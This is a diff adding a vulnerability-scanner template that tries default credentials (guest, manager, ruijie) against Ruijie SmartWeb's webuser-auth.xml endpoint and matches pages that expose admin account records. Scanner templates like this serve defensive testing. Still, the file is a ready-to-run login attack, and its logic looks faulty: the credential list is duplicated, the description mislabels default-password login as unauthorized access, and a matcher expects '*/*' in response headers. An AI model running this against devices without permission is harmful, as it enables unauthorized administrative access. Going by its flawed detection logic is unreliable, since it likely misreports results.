@@ -1,0 +1,60 @@
+id: ruijie-smartweb-webuser-auth-xml-ultra-vires
+
+info:
+  name: Ruijie SmartWeb Unauthorized Access to webuser-auth.xml
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: authorization-bypass, ruijie, smartweb
+  description: |
+    The Ruijie SmartWeb webuser-auth.xml endpoint is vulnerable to unauthorized access, allowing attackers to gain unauthorized administrative privileges.
+
+variables:
+  payloads:
+    - "{{base64('guest:guest')}}"
+    - "{{base64('manager:manager')}}"
+    - "{{base64('ruijie:ruijie')}}"
+  random: "{{base64(concat('root:', rand_text_alphanumeric(8)))}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: first-request
+    method: GET
+    path:
+      - /web/xml/webuser-auth.xml
+    headers:
+      Authorization: Basic {{random}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Authorization Required"
+
+  - id: second-request
+    method: GET
+    path:
+      - /web/xml/webuser-auth.xml
+    headers:
+      Authorization: Basic {{payloads}}
+    payloads:
+      payloads:
+        - "{{base64('guest:guest')}}"
+        - "{{base64('manager:manager')}}"
+        - "{{base64('ruijie:ruijie')}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<userauth>"
+          - "admin"
+          - "<level>0</level>"
+      - type: word
+        part: header
+        words:
+          - "*/*"
